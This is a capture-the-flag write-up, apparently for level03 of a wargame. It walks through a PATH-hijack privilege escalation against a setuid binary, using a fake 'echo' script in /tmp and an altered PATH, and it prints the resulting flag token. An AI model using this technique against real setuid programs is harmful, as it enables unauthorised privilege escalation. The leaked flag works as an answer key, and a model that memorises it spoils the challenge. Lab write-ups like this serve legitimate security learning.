ls
|
L-> level03

./level03
|
L-> Exploit me 

executable file ? check the perm 

ll
|
L-> -rwsr-sr-x 1 flag03 [...] level03

the executable file is created by the user flag03 and we run it as him with the s byte 
we cand try to do a suid exploit

file level03
|
L-> level03: setuid setgid [...]

bingo the executable set the uid of flag03 when executed

but how this prog works ?

strings level03
|
L-> /lib/ld-linux.so.2
L->[...]
L->/usr/bin/env echo Exploit me

ohhh yeah the program just use the echo builtin from the env to print Exploit me 
so we can recreate a fake echo cmd and add it to env

what does this fake echo should do ? as it will be run as flag03, we just want him to return to us the flag
with..... getflag ! (located in /bin/getflag)

echo "/bin/getflag" > /tmp/echo

chmod +x /tmp/echo

export PATH=/tmp:$PATH

the executable will be search in order in PATH var, so like this, the echo cmd will be search first in /tmp
and THERE is an echo executable in it :D 
so know if we re-execute the program:

./level03

L-> Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

here it is :D the getflag have been launch as flag03 soooo we get the flag
